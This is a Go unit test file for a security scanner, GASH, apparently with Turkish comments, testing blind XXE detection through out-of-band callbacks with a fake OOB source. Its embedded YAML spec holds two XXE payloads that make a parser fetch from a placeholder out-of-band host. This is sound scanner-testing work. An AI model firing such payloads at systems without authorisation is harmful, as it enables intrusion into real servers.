// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Modül: github.com/Xmar1881/Gash

package loader

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"testing"

	"github.com/Xmar1881/Gash/internal/plugin"
)

const tier1OOBTest = `id: xxe-oob-test
name: Blind XXE OOB test build for unit tests
description: Unit test build for deferred multi-payload OOB verification with enough length.
severity: critical
tags: [xxe, oob]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 50
phase: probe
order: 50
api_version: "1.0"
oob: required
tests: tests/fixtures/xxe-oob/
request:
  method: POST
  param_names: [xml, data]
  payload: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{OOB_DOMAIN}}/xxe"> %xxe;]><foo/>'
  payloads:
    - '<!DOCTYPE foo SYSTEM "http://{{OOB_DOMAIN}}/xxe2"><foo/>'
oracle:
  name: oob
  params:
    namespace: "sqli"
`

// fakeOOBSource mints deterministic tokens and can pre-arm a subset as hit.
type fakeOOBSource struct {
	mu         sync.Mutex
	seq        int
	hits       map[string]bool
	waitAnyLog [][]string
}

func (f *fakeOOBSource) Generate() (string, string, string, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.seq++
	corr := fmt.Sprintf("c_tok%d", f.seq)
	return corr, corr + ".oob.test", "http://oob.test/cb/" + corr, nil
}

func (f *fakeOOBSource) Wait(_ context.Context, corr string) bool {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.hits[corr]
}

func (f *fakeOOBSource) WaitAny(_ context.Context, ids []string) []string {
	f.mu.Lock()
	defer f.mu.Unlock()
	cp := append([]string(nil), ids...)
	f.waitAnyLog = append(f.waitAnyLog, cp)
	var out []string
	for _, id := range ids {
		if f.hits[id] {
			out = append(out, id)
		}
	}
	return out
}

// TestTier1OOBDeferredMatch: iki payload da gönderilir; yalnız callback alan
// token confirmed bulgu üretir ve WaitAny TEK kez çağrılır (paylaşılan pencere).
func TestTier1OOBDeferredMatch(t *testing.T) {
	spec, file, err := ParseTier1YAML("xxe.yaml", []byte(tier1OOBTest))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	var mu sync.Mutex
	var urls []string
	sender := func(ctx context.Context, method, rawURL string, reqHeaders map[string]string, reqBody []byte) (int, http.Header, string, error) {
		mu.Lock()
		urls = append(urls, rawURL)
		mu.Unlock()
		return 200, http.Header{"Content-Type": []string{"text/xml"}}, `<ok/>`, nil
	}
	src := &fakeOOBSource{hits: map[string]bool{}}
	opts := Tier1Options{OOB: src}
	// İlk iki istek tok1 (xml) + tok2 (xml, payload2); ikinci parametre data:
	// tok3 + tok4. Yalnız tok2 callback alsın.
	src.hits["c_tok2"] = true

	res, err := ExecuteTier1WithOptions(context.Background(), spec, file, "http://example.com/api", sender, opts)
	if err != nil {
		t.Fatalf("execute: %v", err)
	}
	mu.Lock()
	sent := len(urls)
	mu.Unlock()
	// İlk parametre payload1 tok1 (miss) + payload2 tok2 (hit) → 2 istek.
	// İkinci parametre de aynı döngüyle 2 istek daha gönderir (deferred model:
	// kabul erken bilinmez; tüm tokenler tek pencerede doğrulanır).
	if sent != 4 {
		t.Fatalf("4 istek bekleniyordu, got %d", sent)
	}
	if len(res) != 1 {
		t.Fatalf("tek confirmed bulgu bekleniyordu: %+v", res)
	}
	cand := res[0].Candidate
	if cand.OracleName != "oob" {
		t.Fatalf("oracle oob olmalı: %+v", cand)
	}
	if cand.OracleParams["correlation"] != "c_tok2" || cand.OracleParams["namespace"] != "sqli" {
		t.Fatalf("token/namespace eşleşmeli: %+v", cand.OracleParams)
	}
	if !strings.Contains(cand.InjectionPoint.Value, "c_tok2.oob.test") {
		t.Fatalf("payload gerçek OOB domainiyle genişletilmeli: %q", cand.InjectionPoint.Value)
	}
	if strings.Contains(cand.InjectionPoint.Value, "{{") {
		t.Fatalf("literal placeholder kalmamalı: %q", cand.InjectionPoint.Value)
	}
	if res[0].Evidence == nil || res[0].Evidence.ConfidenceContribution != plugin.ConfidenceConfirmed {
		t.Fatalf("confirmed kanıt bekleniyordu: %+v", res[0].Evidence)
	}
	if len(src.waitAnyLog) != 1 {
		t.Fatalf("WaitAny tek çağrı olmalı (paylaşılan pencere), got %d", len(src.waitAnyLog))
	}
	if len(src.waitAnyLog[0]) != 4 {
		t.Fatalf("4 token tek pencerede doğrulanmalı, got %v", src.waitAnyLog[0])
	}
}

// TestTier1OOBNoMatchNoFinding: hiçbir token callback almazsa bulgu YOK.
func TestTier1OOBNoMatchNoFinding(t *testing.T) {
	spec, file, err := ParseTier1YAML("xxe.yaml", []byte(tier1OOBTest))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	sender := func(ctx context.Context, method, rawURL string, reqHeaders map[string]string, reqBody []byte) (int, http.Header, string, error) {
		return 200, http.Header{"Content-Type": []string{"text/xml"}}, `<ok/>`, nil
	}
	src := &fakeOOBSource{hits: map[string]bool{}}
	res, err := ExecuteTier1WithOptions(context.Background(), spec, file, "http://example.com/api", sender, Tier1Options{OOB: src})
	if err != nil {
		t.Fatalf("execute: %v", err)
	}
	if len(res) != 0 {
		t.Fatalf("callback yoksa bulgu olmamalı: %+v", res)
	}
}

// TestTier1OOBWithoutProviderInert: provider yokken payload literal kalır ve
// hiçbir bulgu üretilmez (mevcut skip disiplini; sahte kanıt yok).
func TestTier1OOBWithoutProviderInert(t *testing.T) {
	spec, file, err := ParseTier1YAML("xxe.yaml", []byte(tier1OOBTest))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	var mu sync.Mutex
	var urls []string
	sender := func(ctx context.Context, method, rawURL string, reqHeaders map[string]string, reqBody []byte) (int, http.Header, string, error) {
		mu.Lock()
		urls = append(urls, rawURL)
		mu.Unlock()
		return 200, http.Header{"Content-Type": []string{"text/xml"}}, `<ok/>`, nil
	}
	res, err := ExecuteTier1(context.Background(), spec, file, "http://example.com/api", sender)
	if err != nil {
		t.Fatalf("execute: %v", err)
	}
	if len(res) != 0 {
		t.Fatalf("provider yokken bulgu olmamalı: %+v", res)
	}
	mu.Lock()
	defer mu.Unlock()
	if len(urls) == 0 {
		t.Fatal("istekler yine de gönderilmeli (mevcut davranış)")
	}
	for _, u := range urls {
		if !strings.Contains(u, "%7B%7BOOB_DOMAIN%7D%7D") && !strings.Contains(u, "{{OOB_DOMAIN}}") {
			t.Fatalf("provider yokken placeholder literal kalmalı: %q", u)
		}
	}
}

// TestFinishPendingOOBNilOptions güvenlik ağı: nil/boş opts panik üretmez.
func TestFinishPendingOOBNilOptions(t *testing.T) {
	if got := finishPendingOOB(context.Background(), nil); got != nil {
		t.Fatalf("nil opts nil dönmeli: %+v", got)
	}
	if got := finishPendingOOB(context.Background(), &Tier1Options{}); got != nil {
		t.Fatalf("boş opts nil dönmeli: %+v", got)
	}
}
